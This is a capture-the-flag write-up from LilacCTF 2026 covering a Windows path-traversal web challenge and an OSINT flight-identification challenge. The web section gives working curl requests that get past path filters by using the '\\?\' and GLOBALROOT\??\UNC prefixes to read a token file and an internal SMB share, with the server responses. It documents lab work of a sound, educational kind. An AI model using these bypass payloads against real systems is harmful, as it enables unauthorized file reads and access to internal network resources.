---
title: LilacCTF 2026 Writeup
date: 2026-01-26
layout: writeup
rank: 1
total_teams: 518
team: Project Sekai
language: en
tags:
  - Web
  - OSINT
---

I participated in LilacCTF 2026 as a member of Project Sekai. My first ever #1 in CTF!!
I contributed to some challenges partially, I was so tired because I joined this CTF after Dreamhack Invitational Quals.
![](/assets/img/lilac_ctf_2026/scoreboard.png)

# [Web] Path
A Windows path traversal challenge.
![](/assets/img/lilac_ctf_2026/path.png)

This challenge has 2 stages. Stage1 is to get `C:\token\access_key.txt`, stage2 is to access `172.20.0.10` and get `flag.txt`.
```sh
$ curl http://1.95.51.2:8080/api/info
{"data":{"challenge":"Path Maze","hints":["Stage 1: Find and read the access token from the system","Stage 2: Use the token to access the backup server","Token location: C:\\token\\access_key.txt","Backup server: 172.20.0.10","Backup server SMB Share name: backup","Flag file: flag.txt"],"stages":2,"version":"1.0.0"},"success":true}
```

There are some filters.
- Directory Restrictions: Simple absolute paths (e.g., `C:\token\access_key.txt`) were rejected with a "Path not in allowed directory" error.
- Path Traversal Prevention: Paths containing `..` or `../` were rejected with a "Path traversal not allowed" error.
- Device Path Prevention: Device paths such as `//./` were blocked.
- NT Namespace Restrictions: Prefixes like `\??\` and `GLOBALROOT` were also restricted.

But Win32 file namespace prefix `\\?\` is accepted.
Stage1 is passed with this:
```sh
$ curl -sG "http://1.95.51.2:8080/api/diag/read" --data-urlencode 'path=\\?\C:\token\access_key.txt'
{"message":"Access key verified! Here is your Stage 2 token.","success":true,"token":"SlR9QZfR3Jhxc7ONiW5mkDXtXf-DlyOyJSzX3Inu6cM","token_expires_in":300}
```

Stage2 requires to network access. I thought to use UNC path like `//./UNC/172.20.0.10/backup/flag.txt` but filter rejects with  "UNC path not allowed" error.

Finally, my teammate solved stage2.
```sh
$ curl -sG "http://1.95.51.2:8080/api/export/read" --data-urlencode 'path=\\?\GLOBALROOT\??\UNC\172.20.0.10\backup\flag.txt' --data-urlencode 'token=B77ZUznknJJz8a7xV-I9A9NuRbyFPzJV8Gb2g
YxSZZA'
{"content":"LilacCTF{W1n32_t0_NT_P4th_C0nv3rs10n_M4st3r_2026}","size":50,"success":true}
```
`LilacCTF{W1n32_t0_NT_P4th_C0nv3rs10n_M4st3r_2026}`


# [OSINT] Sky Is Ours
Desctiption:
> John likes to choose window seats on airplanes. He took this photo on a plane on April 10, 2025. What was his flight number?
>
> The final flag is LilacCTF{flight number}.
> Note: The flight number should be the actual operating flight number, in all capital letters.

The distribution image is
![](/assets/img/lilac_ctf_2026/sky.jpeg)

My teammate already found the place and airline:
- Place: Dalian (大連)
- Airline: Qingdao Airlines (青島航空)

The time this picture was taken is in exif:
- DateTimeOriginal: 2025:04:10 11:20:42
- OffsetTimeOriginal: +08:00 (CST)

I found this thread on Reddit and flight records (for free!):
[https://www.reddit.com/r/aviation/comments/1iy0qir/free_past_flight_data_website/](https://www.reddit.com/r/aviation/comments/1iy0qir/free_past_flight_data_website/)
[https://www.flightera.net/](https://www.flightera.net/)

Qingdao Airlines all planes list is here:
[https://www.flightera.net/en/airline/Qingdao+Airlines](https://www.flightera.net/en/airline/Qingdao+Airlines)

I checked manually all flight around 2025/04/10 11:20 (CST), finally I got it.
[https://www.flightera.net/en/flight_details/Qingdao+Airlines/QW6097/ZYHB/2025-04-10](https://www.flightera.net/en/flight_details/Qingdao+Airlines/QW6097/ZYHB/2025-04-10)
![](/assets/img/lilac_ctf_2026/flight.png)

`LilacCTF{QW6097}`
